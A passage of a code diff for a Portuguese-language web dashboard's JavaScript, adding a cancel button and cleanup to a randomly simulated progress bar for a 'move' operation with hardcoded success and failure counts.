+  document.getElementById('move-ok').textContent = '0';
+  document.getElementById('move-fail').textContent = '0';
+
+  if (moveInterval) clearInterval(moveInterval);
+
+  let pct = 0;
+  const total = 1618;
+  moveInterval = setInterval(() => {
+    pct = Math.min(pct + Math.random() * 3, 100);
+    const ok = Math.floor(pct / 100 * 1589);
+    const fail = Math.floor(pct / 100 * 29);
+    document.getElementById('move-bar').style.width = pct + '%';
+    document.getElementById('move-pct').textContent = Math.floor(pct) + '%';
     document.getElementById('move-ok').textContent = ok.toLocaleString();
     document.getElementById('move-fail').textContent = fail;
-    if(pct >= 100) {
-      clearInterval(interval);
+    if (pct >= 100) {
+      clearInterval(moveInterval);
+      moveInterval = null;
       document.getElementById('move-status-text').textContent = '✅ Concluído!';
+      document.getElementById('btn-cancelar').style.display = 'none';
     }
   }, 80);
 }
 
-// Init
+function cancelarMover() {
+  if (moveInterval) {
+    clearInterval(moveInterval);
+    moveInterval = null;
+  }
+  document.getElementById('move-status-text').textContent = '⛔ Cancelado pelo usuário';
+  document.getElementById('btn-cancelar').style.display = 'none';
+}
+
+// ─── INIT ────────────────────────────────────────────────
+renderDashBots();
 renderTokens(tokensData);
 </script>
 </body>
